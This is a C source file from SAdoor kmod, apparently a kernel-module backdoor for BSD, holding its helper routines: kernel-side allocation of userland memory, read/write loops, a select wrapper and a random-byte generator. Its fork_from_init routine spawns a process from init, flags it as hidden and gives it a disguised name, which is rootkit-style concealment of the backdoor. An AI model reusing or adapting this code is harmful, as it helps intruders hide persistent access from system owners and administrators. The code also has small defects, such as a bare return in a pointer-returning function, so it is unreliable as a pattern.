/*
 *  File: utils.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod common used routines
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 * 
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 * 
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */         

#include <sys/types.h>
#include <sys/systm.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/unistd.h>
#include <sys/mount.h>
#include <sys/syscallargs.h>
#include <sys/mman.h>
#include <sys/malloc.h>
#include <sys/proc.h>
#include <sys/kthread.h>
#include <sys/select.h>
#include "sadoor.h"

/*
 * Allocates userland memory.
 *
 * Adds a sys_munap_args "header" for uland_free() to use.
 */
void *
uland_calloc(size_t size)
{
    struct sys_mmap_args margs;
    struct sys_munmap_args *muargs;
    struct proc *p;
	register_t retval[2];
    int error;

    p = curproc;

	if (p == NULL) {
		debug(1, "uland_calloc(): curproc is NULL\n");
		return;
	}

	debug(3, "Entered uland_calloc(%u)\n", size);
	
    SCARG(&margs, addr) = 0x00;
    SCARG(&margs, len) = size + sizeof(struct sys_munmap_args);
    SCARG(&margs, prot) = PROT_READ|PROT_WRITE;
    SCARG(&margs, flags) = MAP_ANON|MAP_PRIVATE;
    SCARG(&margs, fd) = -1;
    SCARG(&margs, pad) = 0x0;
    SCARG(&margs, pos) = 0;

    if (size == 0) {
        log(1, "Error: uland_calloc(): Refusing to allocate zero bytes\n");
        return(NULL);
    }

    if ( (error = sys_mmap(p, &margs, retval))) {
        log(1, "Panic: mmap() failed: %d [exiting]\n", error);
        exit1(p, error);
    }
    
    muargs = (struct sys_munmap_args *)(retval[0]);
    memset(muargs, 0x00, sizeof(struct sys_munmap_args) + size);
    (void)suword(&SCARG(muargs, addr), (int)muargs);
    (void)suword(&SCARG(muargs, len), sizeof(struct sys_munmap_args) + size);

    debug(3, "uland_calloc(): Returning address 0x%08x for block of %u bytes\n",
        (u_int)muargs, size + sizeof(struct sys_munmap_args));

    return((void *)(muargs +1));
}

/*
 * Free userland memory allocated with uland_malloc()
 */
void
uland_free(void *upt)
{
    struct sys_munmap_args *muargs;
    struct proc *p;
    u_int len;
	register_t retval[2];
    int error;

    if (upt == NULL) {
        log(1, "Error: uland_free(): Received NULL pointer\n");
        return;
    }

    p = curproc;

	if (p == NULL) {
		debug(1, "uland_free(): curproc is NULL\n"); 
		return;
	}
	
    muargs = (struct sys_munmap_args *)upt -1;
    len = (u_int)fuword(&SCARG(muargs, len));
    
    if ( (error = sys_munmap(p, muargs, retval))) {
        log(1, "Error: Failed to free memory: %d\n", error);
    }
    else {
        debug(3, "uland_free(): Free'd %u bytes\n", len);
    }
}

/*
 * Allocate kernel space memory as, ehrm, temporary memory.
 */
void *
kspace_calloc(size_t size)
{
    void *ptr;

    if ( (ptr = malloc(size, M_TEMP, M_ZERO|M_WAITOK)) == NULL) {
        log(1, "Panic: kspace_calloc(): malloc() failed [exiting]\n");
        kthread_exit(1);
    }

    return(ptr);
}

/*
 * Fork from init, returns 0 on success.
 */
int
fork_from_init(void (*function)(void *), void *arg)
{
    struct proc *uproc;
	struct proc *tmp;
    int error;
    int s;

    s = splhigh();

		tmp = curproc;
		curproc = (curproc ==  NULL) ? &proc0 : curproc;

		if ( (error = fork1(initproc, 0, SIGCHLD, NULL, 0, function, arg, NULL, &uproc))) {
			log(1, "Error: fork_from_init(): Can't fork: %d\n", error);
			splx(s);
			return(error);
		}

#ifdef SAKMOD_HIDE_PROCS
        uproc->p_flag |= SAKMOD_HIDDEN_PROC_FLAG;
#endif /* SAKMOD_HIDE_PROCS */

        snprintf(uproc->p_comm, MAXCOMLEN, "%s", SAKMOD_PROC_NAME);
        debug(2, "Forked from init, got pid %d (struct proc = 0x%08x)\n", uproc->p_pid, uproc);
		curproc = tmp;

	splx(s);
    return(0);
}


/*
 * Write N bytes to a file descriptor,
 * wargs is assumed to be a userland address.
 */
ssize_t
writen(struct proc *p, struct sys_write_args *wargs)
{
    size_t tot = 0;
    ssize_t n;
    u_char *pt;
	register_t retval[2];
    int error;

    n = fuword(&SCARG(wargs, nbyte));
    pt = (u_char *)fuword(&SCARG(wargs, buf));

    do {
        (void)suword(&SCARG(wargs, buf), (int)(pt + tot));
        (void)suword(&SCARG(wargs, nbyte), n - tot);

        if ( (error = sys_write(p, wargs, retval))) {
            log(1, "Error: writen(): %d\n", error);
            return(-1);
        }
        
        tot += retval[0];
    } while (tot < n);

    debug(3, "Wrote %d bytes\n", tot);
    return(tot);
}

/*
 * Read N bytes from a file descriptor,
 * rargs is assumed to be a userland address.
 */
ssize_t
readn(struct proc *p, struct sys_read_args *rargs)
{
    ssize_t tot = 0;
    ssize_t n;
    u_char *pt;
	register_t retval[2];
    int error;

    n = fuword(&SCARG(rargs, nbyte));
    pt = (u_char *)fuword(&SCARG(rargs, buf));

    do {
        (void)suword(&SCARG(rargs, buf), (int)(pt + tot));
        (void)suword(&SCARG(rargs, nbyte), n - tot);
        
        if ( (error = sys_read(p, rargs, retval))) {
            log(1, "Error: readn(): %d\n", error);
            return(-1);
        }
        
        tot += retval[0];
    } while (tot < n);

    debug(3, "readn(): Read %d bytes\n", tot);
    return(tot);
}

/*  
 * Locate bytes in buffer.
 * Returns index to start of str in buf on success, 
 * -1 if string was not found.
 */ 
ssize_t
utils_memstr(void *big, size_t blen, const void *little, size_t llen)
{
    ssize_t i = 0;
 
    if (blen < llen) 
        return(-1);
 
    while ( (blen - i) >= llen) {
        if (memcmp(((char *)big + i), little, llen) == 0)
            return(i); 
        i++;
    }
 
    return(-1); 
}

/*  
 * Returns 1 if file descriptor is ready for writing,
 * 0 otherwise.
 */ 
int 
ready_write(int fd)
{
    fd_set *writeset;
    struct sys_select_args *slargs;
    struct timeval *tv;
    struct proc *p;
	register_t retval[2];
    int error = 0;

    p = curproc;
    writeset = (fd_set *)uland_calloc(sizeof(fd_set) + 
            sizeof(struct sys_select_args) + 
            sizeof(struct timeval));
    slargs = (struct sys_select_args *)(writeset +1);
    tv = (struct timeval *)(slargs +1);
 
    FD_ZERO(writeset);
    FD_SET(fd, writeset);

    (void)suword(&SCARG(slargs, nd), fd+1);
    (void)suword(&SCARG(slargs, in), NULL);
    (void)suword(&SCARG(slargs, ou), (int)writeset);
    (void)suword(&SCARG(slargs, ex), NULL);
    (void)suword(&SCARG(slargs, tv), (int)tv);
    if ((error = sys_select(p, slargs, retval))) {
        log(1, "Error: ready_write(): select failed: %d\n", error);
        uland_free(writeset);
        return(0);
    }
    uland_free(writeset);
    return(retval[0] > 0 ? 1 : 0); 
}

/*
 * Generate len bytes of random bytes and store it in buf.
 * Code influed by lib/libkern/random.c (NetBSD 1.6.1).
 */
void
random_bytes(u_char *buf, size_t len)
{
    static u_long randseed = 1;
	long x;
	size_t i;
	long hi; 
	long lo; 
	long t;

	/* First time throught, create seed */
	if (randseed == 1) {
		struct timeval tv;
		struct proc *p;
	
		p = (curproc == NULL) ? initproc : curproc;
		microtime(&tv);
		randseed = (tv.tv_sec ^ tv.tv_usec) ^ p->p_pid;
	}



	for (i=0; i<len; i++) {

	    /*
		 * Compute x[n + 1] = (7^5 * x[n]) mod (2^31 - 1).
	     * From "Random number generators: good ones are hard to find",
	     * Park and Miller, Communications of the ACM, vol. 31, no. 10,
	     * October 1988, p. 1195.
	     */
    	x = randseed;
    	hi = x / 127773;
    	lo = x % 127773;
    	t = 16807 * lo - 2836 * hi;
    	if (t <= 0)
        	t += 0x7fffffff;
    	randseed = t;

		buf[i] = (u_char)t;
	}
}
